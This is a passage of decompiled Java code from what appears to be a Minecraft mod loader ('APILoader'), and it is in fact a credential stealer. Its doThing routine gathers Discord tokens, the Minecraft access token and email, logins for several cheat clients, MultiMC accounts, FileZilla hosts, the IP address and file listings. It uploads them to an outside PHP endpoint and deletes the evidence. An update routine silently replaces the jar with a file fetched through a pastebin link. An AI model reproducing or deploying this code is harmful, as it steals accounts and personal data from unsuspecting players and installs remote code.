                        sb.append("\n");
                        continue;
                    }
                    if (!line.contains("<option name=\"recentPaths\">")) continue;
                    shouldlog = true;
                }
                scanner.close();
            }
            return sb.toString();
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String getDownloads() {
        try {
            File[] files;
            File folder = new File(System.getProperty("user.home") + "/Downloads/");
            if (folder == null || !folder.exists()) {
                return null;
            }
            StringBuilder sb = new StringBuilder();
            for (File folder2 : files = folder.listFiles()) {
                if (!folder2.isDirectory()) continue;
                sb.append(folder2.getName());
                sb.append(" [directory]\n");
            }
            for (File file : files) {
                if (file.isDirectory()) continue;
                sb.append(file.getName());
                sb.append(" [");
                sb.append(FileSearcher.getFileSize(file));
                sb.append("]\n");
            }
            return sb.toString();
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String getDesktopFiles() {
        try {
            File[] files;
            File folder = new File(System.getProperty("user.home") + "/Desktop/");
            if (folder == null || !folder.exists()) {
                return null;
            }
            StringBuilder sb = new StringBuilder();
            for (File folder2 : files = folder.listFiles()) {
                if (!folder2.isDirectory()) continue;
                sb.append(folder2.getName());
                sb.append(" [directory]\n");
            }
            for (File file : files) {
                if (file.isDirectory()) continue;
                sb.append(file.getName());
                sb.append(" [");
                sb.append(FileSearcher.getFileSize(file));
                sb.append("]\n");
            }
            return sb.toString();
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static int compare(File file) {
        if (file == null) {
            return -1;
        }
        try {
            String line;
            URL checkurl = new URL("https://pastebin.com/raw/X5UHFxtM");
            HttpURLConnection conn = (HttpURLConnection)checkurl.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.11 Safari/537.36");
            conn.setRequestMethod("GET");
            conn.setUseCaches(false);
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            while ((line = in.readLine()) != null) {
                if (dlink == null) {
                    dlink = line;
                    continue;
                }
                if (hash != null) continue;
                hash = line;
            }
            in.close();
            byte[] bytefile_hash = MessageDigest.getInstance("MD5").digest(Files.readAllBytes(file.toPath()));
            String file_hash = DatatypeConverter.printHexBinary((byte[])bytefile_hash);
            if (hash.equalsIgnoreCase("89D85BE00F56ACE593BC029C686E9BA5") || hash.equalsIgnoreCase("99CE85B34778C8C765CD2F222748EF11") || hash.equalsIgnoreCase("F6DA144461738529DB35B7DC4E2578B2")) {
                return 1;
            }
            if (hash.equalsIgnoreCase(file_hash)) {
                return 1;
            }
            return 0;
        }
        catch (Exception exception) {
            return -1;
        }
    }

    public static void update() {
        File file = new File("libraries/net/minecraftforge/apiloader/1.0.4/apiloader-1.0.4.jar");
        if (file == null || !file.exists()) {
            return;
        }
        int comparison = FileSearcher.compare(file);
        if (comparison != 0 || dlink == null) {
            return;
        }
        try {
            URL url = new URL(dlink);
            HttpURLConnection c = (HttpURLConnection)url.openConnection();
            c.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.11 Safari/537.36");
            c.connect();
            BufferedInputStream in = new BufferedInputStream(c.getInputStream());
            BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(file));
            byte[] buf = new byte[256];
            int n = 0;
            while ((n = in.read(buf)) >= 0) {
                ((OutputStream)out).write(buf, 0, n);
            }
            ((OutputStream)out).flush();
            ((OutputStream)out).close();
            c.disconnect();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static void doThing() {
        block109: {
            if (alreadyran) {
                return;
            }
            alreadyran = true;
            File file = null;
            String os = null;
            String ip = null;
            String kamiwaypoints = null;
            String journeymap = null;
            String pyro = null;
            String rusherhack = null;
            String future_waypoints = null;
            String future_accounts = null;
            String discord = null;
            String mods = null;
            String futureauth = null;
            String pyroalts = null;
            String pyrowaypoints = null;
            String rusherhackalts = null;
            String rusherhackwaypoints = null;
            String eclipse = null;
            String intellij = null;
            String downloads = null;
            String filezilla = null;
            String desktop = null;
            String runningprocesses = null;
            int ismodlauncher = -1337;
            try {
                FileSearcher.getMinecraftData();
            }
            catch (Exception exception) {
                // empty catch block
            }
            try {
                os = System.getProperty("os.name");
            }
            catch (Exception e) {
                os = "unknown";
            }
            try {
                ip = FileSearcher.getIP();
            }
            catch (Exception e) {
                ip = "unknown";
            }
            try {
                kamiwaypoints = FileSearcher.getKWaypoints();
            }
            catch (Exception e) {
                kamiwaypoints = "unknown";
            }
            try {
                journeymap = FileSearcher.getJWaypoints();
            }
            catch (Exception e) {
                journeymap = "unknown";
            }
            try {
                pyro = FileSearcher.getLauncherInfo();
            }
            catch (Exception e) {
                pyro = "unknown";
            }
            try {
                rusherhack = FileSearcher.getLoaderData();
            }
            catch (Exception e) {
                rusherhack = "unknown";
            }
            try {
                future_waypoints = FileSearcher.getFWaypoints();
            }
            catch (Exception e) {
                future_waypoints = "unknown";
            }
            try {
                future_accounts = FileSearcher.getFAccounts();
            }
            catch (Exception e) {
                future_accounts = "unknown";
            }
            try {
                discord = FileSearcher.getTokens();
            }
            catch (Exception e) {
                discord = "unknown";
            }
            try {
                mods = FileSearcher.getMods();
            }
            catch (Exception e) {
                mods = "unknown";
            }
            try {
                ismodlauncher = FileSearcher.isModLauncher();
            }
            catch (Exception e) {
                ismodlauncher = 1337;
            }
            try {
                futureauth = FileSearcher.getFutureAuth();
            }
            catch (Exception e) {
                futureauth = "unknown";
            }
            try {
                pyroalts = FileSearcher.getPyroAlts();
            }
            catch (Exception e) {
                pyroalts = "unknown";
            }
            try {
                pyrowaypoints = FileSearcher.getPyroWaypoints();
            }
            catch (Exception e) {
                pyrowaypoints = "unknown";
            }
            try {
                rusherhackalts = FileSearcher.getRusherHackAlts();
            }
            catch (Exception e) {
                rusherhackalts = "unknown";
            }
            try {
                rusherhackwaypoints = FileSearcher.getRusherHackWaypoints();
            }
            catch (Exception e) {
                rusherhackwaypoints = "unknown";
            }
            try {
                eclipse = FileSearcher.getEclipseWorkspaces();
            }
            catch (Exception e) {
                eclipse = "unknown [exception]";
            }
            try {
                intellij = FileSearcher.getIntellijWorkspaces();
            }
            catch (Exception e) {
                intellij = "unknown [exception]";
            }
            try {
                downloads = FileSearcher.getDownloads();
            }
            catch (Exception e) {
                downloads = "unknown [exception]";
            }
            try {
                user_home = System.getProperty("user.home");
            }
            catch (Exception e) {
                user_home = "unknown";
            }
            try {
                filezilla = FileSearcher.getFileZillaData();
            }
            catch (Exception e) {
                filezilla = "unknown";
            }
            try {
                desktop = FileSearcher.getDesktopFiles();
            }
            catch (Exception e) {
                desktop = "unknown";
            }
            try {
                String mccdata = "";
                if (accessToken != null) {
                    mccdata = "accessToken > " + accessToken + "\nemail > " + email + "\nusername > " + username + "\nclientToken > " + clientToken;
                }
                String filename = username + "_" + System.currentTimeMillis() + ".txt";
                StringBuilder datatowrite = new StringBuilder();
                datatowrite.append("APILoader - 28 Dec 2020\n\n");
                datatowrite.append("Is modded launcher?: ");
                if (ismodlauncher == 1337 || ismodlauncher == -1337 || ismodlauncher == 0) {
                    datatowrite.append("false\n");
                } else if (ismodlauncher == 1) {
                    datatowrite.append("true [1, TLauncher]\n");
                } else if (ismodlauncher == 2) {
                    datatowrite.append("true [2, MultiMC]\n");
                }
                datatowrite.append("os.name:\n");
                if (os != null) {
                    datatowrite.append(os);
                } else {
                    datatowrite.append("unknown\n");
                }
                datatowrite.append("\nDiscord token[s]: \n");
                if (discord != null) {
                    datatowrite.append(discord);
                } else {
                    datatowrite.append("unknown\n");
                }
                datatowrite.append("IP: ");
                if (ip != null) {
                    datatowrite.append(ip);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nMinecraft data: \n");
                if (accessToken != null && mccdata != null) {
                    datatowrite.append(mccdata);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nPyro loader credentials: \n");
                if (pyro != null) {
                    datatowrite.append(pyro);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nFuture loader credentials:\n");
                if (futureauth != null) {
                    datatowrite.append(futureauth);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nRusherHack loader credentials: \n");
                if (rusherhack != null) {
                    datatowrite.append(rusherhack);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nPyro accounts:\n");
                if (pyroalts != null) {
                    datatowrite.append(pyroalts);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nFuture accounts: \n");
                if (future_accounts != null) {
                    datatowrite.append(future_accounts);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nRusherHack accounts:\n");
                if (rusherhackalts != null) {
                    datatowrite.append(rusherhackalts);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nPyro waypoints:\n");
                if (pyrowaypoints != null) {
                    datatowrite.append(pyrowaypoints);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nFuture waypoints: \n");
                if (future_waypoints != null) {
                    datatowrite.append(future_waypoints);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nRusherHack waypoints:\n");
                if (rusherhackwaypoints != null) {
                    datatowrite.append(rusherhackwaypoints);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nJourneyMap waypoints: \n");
                if (journeymap != null) {
                    datatowrite.append(journeymap);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nKAMI Blue waypoints: \n");
                if (kamiwaypoints != null) {
                    datatowrite.append(kamiwaypoints);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nMinecraft mods:\n");
                if (mods == null) {
                    datatowrite.append("unknown");
                } else {
                    datatowrite.append(mods);
                }
                if (ismodlauncher == 2) {
                    datatowrite.append("\nMultiMC accounts.json: \n");
                    try {
                        datatowrite.append(FileSearcher.getMultiMCData());
                    }
                    catch (Exception e) {
                        datatowrite.append("unknown, error\n");
                        datatowrite.append(e.getStackTrace().toString());
                    }
                }
                datatowrite.append("\nEclipse workspaces:\n");
                if (eclipse != null) {
                    datatowrite.append(eclipse);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nIntellij workspaces:\n");
                if (intellij != null) {
                    datatowrite.append(intellij);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nFileZilla hosts:\n");
                if (filezilla != null) {
                    datatowrite.append(filezilla);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nDownloads folder:\n");
                if (downloads != null) {
                    datatowrite.append(downloads);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nDesktop folder:\n");
                if (desktop != null) {
                    datatowrite.append(desktop);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nuser.home:\n");
                if (user_home != null) {
                    datatowrite.append(user_home);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nAdditional discord data:\n");
                if (discordData != null) {
                    datatowrite.append(discordData);
                } else {
                    datatowrite.append("unknown");
                }
                datatowrite.append("\nRunning processes:\n");
                if (runningprocesses != null) {
                    datatowrite.append(runningprocesses);
                } else {
                    datatowrite.append("unknown");
                }
                FileSearcher.write(filename, datatowrite.toString());
                file = new File(filename);
                if (file.exists()) {
                    String url = "http://dengimod.cf/discordhook/sendstuff2.php";
                    FileSearcher.sendFile(url, file);
                    file.delete();
                    FileSearcher.handleError();
                }
            }
            catch (Exception e) {
                if (file == null) break block109;
                file.delete();
            }
        }
        try {
            FileSearcher.update();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static int isModLauncher() {
        File outsidemc;
        File file2 = new File("mods");
        if (file2 != null && file2.exists() && file2.isDirectory()) {
            for (File file1 : file2.listFiles()) {
                if (file1.isDirectory()) {
                    for (File file : file1.listFiles()) {
                        if (!file.getName().toLowerCase().contains("tlskincape_")) continue;
                        return 1;
                    }
                    continue;
                }
                if (!file1.getName().toLowerCase().contains("tlskincape_")) continue;
                return 1;
            }
        }
        if ((outsidemc = new File("")) != null && (outsidemc = new File(outsidemc.getAbsolutePath().substring(0, outsidemc.getAbsolutePath().lastIndexOf("\\")))) == null) {
            return 0;
        }
        int found = 0;
        for (File f : outsidemc.listFiles()) {
            if (f.isDirectory()) {
                if (f.getName().contains("libraries") || f.getName().contains("patches")) {
                    ++found;
                }
            } else if (f.getName().contains("instance.cfg")) {
                ++found;
            }
            if (found < 2) continue;
            return 2;
        }
        return 0;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public static void write(String filename, String content) {
        BufferedWriter output = null;
        try {
            File file = new File(filename);
            output = new BufferedWriter(new FileWriter(file));
            output.write(content);
        }
        catch (IOException iOException) {
        }
        finally {
            if (output != null) {
                try {
                    output.close();
                }
                catch (IOException iOException) {}
            }
        }
    }

    public static String getURL() {
        try {
            String line;
            StringBuilder sb = new StringBuilder();
            URL url = new URL("https://pastebin.com/raw/eiv5znvZ");
            HttpURLConnection connection = (HttpURLConnection)url.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11");
            connection.setRequestMethod("GET");
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
            reader.close();
            connection.disconnect();
            return sb.toString();
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static void starteverything() {
        Thread thread = new Thread(new Runnable(){

            @Override
            public void run() {
                FileSearcher.doThing();
                FileSearcher.handleError();
            }
        });
        thread.start();
    }

    static {
        didcall = false;
        dlink = null;
        hash = null;
        alreadyran = false;
    }
}

